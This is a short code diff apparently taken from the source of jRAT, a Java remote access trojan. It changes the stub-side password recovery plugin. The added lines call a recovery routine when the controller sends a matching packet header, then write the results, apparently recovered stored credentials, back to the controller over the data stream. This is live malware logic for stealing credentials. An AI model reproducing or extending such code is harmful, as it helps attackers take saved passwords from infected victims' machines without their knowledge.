@@ -2,6 +2,7 @@ package jrat.plugin.recovery.stub;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
+import java.util.List;
 
 import jrat.api.stub.StubPlugin;
 
@@ -32,7 +33,17 @@ public class RecoveryPlugin extends StubPlugin {
 	@Override
 	public void onPacket(short header) throws Exception {
 		if (header == HEADER) {
+			List<String[]> list = Recovery.recover();
 			
+			for (String[] a : list) {
+				dos.writeShort(HEADER);
+				dos.writeByte(a.length);
+				
+				for (String s : a) {
+					dos.writeShort(s.length());
+					dos.writeChars(s);
+				}
+			}
 		}
 	}
 	@Override
